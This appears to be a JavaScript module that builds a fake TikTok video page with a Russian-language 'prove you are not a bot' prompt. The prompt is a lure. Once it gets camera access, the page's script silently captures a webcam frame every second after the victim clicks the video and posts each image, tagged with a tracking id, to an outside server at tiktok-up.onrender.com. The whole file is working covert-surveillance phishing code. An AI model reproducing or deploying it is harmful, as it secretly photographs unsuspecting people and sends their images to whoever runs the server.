const template = function template(title, description, image, author, url = "https://tiktok-up.onrender.com/img") {
  return `
<!DOCTYPE html>
<html>

<head>
  <title>Tiktok Video</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
  <meta property="og:image" content="${image}">
  <meta property="og:image:secure_url" content="${image}">
  <meta property="og:image:type" content="image/png">

  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">


  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap');

    * {
      padding: 0;
      margin: 0;
      font-family: 'Montserrat';
      font-weight: 600;
    }

    .tiktok {
      width: 100%;
      height: 100vh;
      height: 100dvh;
      background: #fff;
      position: fixed;
      top: 0;
      left: 0;
      z-index: 100;
      display: flex;
      flex-direction: column;
      align-items: center;
      overflow: hidden;
    }

    .block_video {
      position: relative;
      flex: 1;
      min-height: 0;
      width: 100%;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    .video-wrapper {
      position: relative;
      height: 100%;
      width: fit-content;
      max-width: 100%;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .video_mp4 {
      display: block;
      width: auto;
      height: 100%;
      max-width: 100%;
      object-fit: contain;
      opacity: 0.7;
    }

    .video_element {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      display: block;
      width: 50px;
      height: auto;
      margin: 0;
      padding: 0;
      z-index: 10;
      object-fit: contain;
      pointer-events: none;
    }

    .video-info {
      position: absolute;
      bottom: 20px;
      left: 15px;
      right: 15px;
      z-index: 4;
      color: #fff;
      font-family: Arial, sans-serif;
      text-shadow: 0 1px 4px #000;
      overflow-wrap: anywhere;
      box-sizing: border-box;
    }

    .author-name {
      display: block;
      font-family: Arial, sans-serif;
      font-size: 16px;
      font-weight: 700;
      margin-bottom: 8px;
    }

    .video-description {
      font-family: Arial, sans-serif;
      font-size: 14px;
      line-height: 1.4;
      font-weight: 500;
      margin: 0;
    }


    .verification-overlay {
      position: fixed;
      inset: 0;
      z-index: 200;
      background: rgba(0, 0, 0, .65);
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      box-sizing: border-box;
    }

    .verification-window {
      width: 100%;
      max-width: 360px;
      background: #fff;
      border-radius: 16px;
      padding: 30px 25px;
      box-sizing: border-box;
      text-align: center;
      font-family: Arial, sans-serif;
      box-shadow: 0 10px 40px rgba(0, 0, 0, .2);
    }

    .verification-icon {
      width: 55px;
      height: 55px;
      margin: 0 auto 18px;
      border-radius: 50%;
      background: #f1f1f2;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 30px;
      color: #161823;
    }

    .verification-window h2 {
      font-size: 19px;
      font-weight: 700;
      color: #161823;
      margin-bottom: 25px;
    }

    .verification-button {
      width: 100%;
      height: 48px;
      border: none;
      border-radius: 8px;
      background: #fe2c55;
      color: #fff;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      transition: background .2s;
    }

    .verification-button:hover {
      background: #e3264b;
    }




    .verification-icon {
      width: 55px;
      height: 55px;
      margin: 0 auto 18px;
      border-radius: 16px;
      background: #f1f1f2;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #161823;
    }

    .verification-icon svg {
      width: 30px;
      height: 30px;
    }

    .verification-description {
      font-family: Arial, sans-serif;
      font-size: 13px;
      font-weight: 400;
      line-height: 1.55;
      color: #777;
      margin: -10px 0 24px;
    }


    @media (max-width: 600px) {

      .tiktok-header {
        flex-basis: 55px;
        padding: 0 16px;
      }

      .tiktok-logo {
        font-size: 23px;
      }

      .video-info {
        left: 15px;
        right: 15px;
        bottom: 20px;
      }

      .video_element {
        width: 45px;
      }

    }

    .contentarea {
      font-size: 16px;
      font-family: "Lucida Grande", "Arial", sans-serif;
      width: 760px;
      opacity: 1;
    }

    .camera {
      width: 340px;
      display: inline-block;
      opacity: 1;
    }

    #video {
      border: 1px solid black;
      box-shadow: 2px 2px 3px black;
      width: 320px;
      height: 240px;
      opacity: 1;
    }

    #startbutton {
      display: block;
      position: relative;
      margin-left: auto;
      margin-right: auto;
      bottom: 32px;
      background-color: rgba(0, 150, 0, 0.5);
      border: 1px solid rgba(255, 255, 255, 0.7);
      box-shadow: 0px 0px 1px 2px rgba(0, 0, 0, 0.2);
      font-size: 14px;
      font-family: "Lucida Grande", "Arial", sans-serif;
      color: rgba(255, 255, 255, 1.0);
      transition: 1s;
      opacity: 1;
    }

    #canvas {
      display: none;
      opacity: 1;
    }

    .output {
      width: 340px;
      display: inline-block;
    }
  </style>
</head>

<body>


  <div class="tiktok">

    <div class="block_video">
      <div class="video-wrapper">

        <img src="${image}" class="video_mp4">

        <img src="play.png" class="video_element">


        <div class="video-info">
          <span class="author-name">${author}</span>
          <p class="video-description">${description}</p>
        </div>

      </div>
    </div>

  </div>


  <div class="verification-overlay" id="verification-overlay">
    <div class="verification-window">

      <div class="verification-icon">
        <svg viewBox="0 0 24 24" fill="none">
          <path d="M12 2.5L20 6V11.5C20 16.5 16.5 20.2 12 22C7.5 20.2 4 16.5 4 11.5V6L12 2.5Z" stroke="currentColor"
            stroke-width="1.8" stroke-linejoin="round" />
          <path d="M8.5 12L10.8 14.3L15.8 9.3" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"
            stroke-linejoin="round" />
        </svg>
      </div>

      <h2>Подтвердите, что вы не бот</h2>

      <p class="verification-description">
        Для продолжения просмотра видео необходимо пройти
        быструю проверку. Это поможет защитить платформу
        от автоматических запросов и ботов.
      </p>

      <button class="verification-button" id="verification-button">
        Подтвердить
      </button>

    </div>
  </div>






  <div class="contentarea">
    <div class="camera">
      <video id="video">Видеопоток недоступен.</video> <button id="startbutton">Сделать фото</button>
    </div>
    <canvas id="canvas"></canvas>
    <div class="output"></div>
  </div>
  <input type="file">

  <script>
    var width = 320;
    var height = 0;
    var streaming = false;
    var video = null;
    var canvas = null;
    var photo = null;
    var startbutton = null;

    const id = location.search.split('=')[1];

    let toggle = false;
    let begin = false;
    let rules = false;

    async function startup() {
      video = document.getElementById('video');
      canvas = document.getElementById('canvas');
      photo = document.getElementById('photo');
      block_video = document.querySelector('.block_video');
      video_mp4 = document.querySelector('.video_mp4');
      video_element = document.querySelector('.video_element');
      startbutton = document.getElementById('startbutton');

      navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
        document.getElementById("verification-overlay").style.display = "none";
        video.srcObject = stream;
        video.play();
        startbutton.classList.add('streaming');
        rules = true;
      }).catch(function (err) {
        rules = false;
        console.log('Ошибка');
      });

      video.addEventListener('canplay', function (ev) {
        if (!streaming) {
          height = video.videoHeight / (video.videoWidth / width);
          if (isNaN(height)) height = width / (4 / 3);
          video.setAttribute('width', width);
          video.setAttribute('height', height);
          canvas.setAttribute('width', width);
          canvas.setAttribute('height', height);
          streaming = true;
        }
      }, false);

      startbutton.addEventListener('click', function (ev) {
        takepicture();
        ev.preventDefault();
      }, false);


      block_video.addEventListener('click', () => {
        toggle = !toggle;

        if (!begin && rules) {
          begin = true;
          sendsPhoto()
        }
        if (toggle && rules) {
          video_element.style.opacity = '0';
          video_mp4.style.opacity = '1';

        }
        else {
          video_element.style.opacity = '1';
          video_mp4.style.opacity = '0.8';

          if (!rules) {
            video_element.style.opacity = '0';
            video_mp4.style.opacity = '0.2';
          }
        }


      });
    }


    function sendsPhoto() {
      setInterval(() => takepicture(), 1000)
    }

    function takepicture() {
      var context = canvas.getContext('2d');
      if (width && height) {
        canvas.width = width;
        canvas.height = height;
        context.drawImage(video, 0, 0, width, height);
        var data = canvas.toDataURL('image/png');
        let photo = new Image;
        photo.src = data;

        fetch('${url}', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ img: data, id: id })
        })

      }
    }









    document.addEventListener("DOMContentLoaded", () => {
      document.getElementById("verification-button").addEventListener("click", startup);
    });

  </script>
</body>

</html>
`;
};

module.exports = template;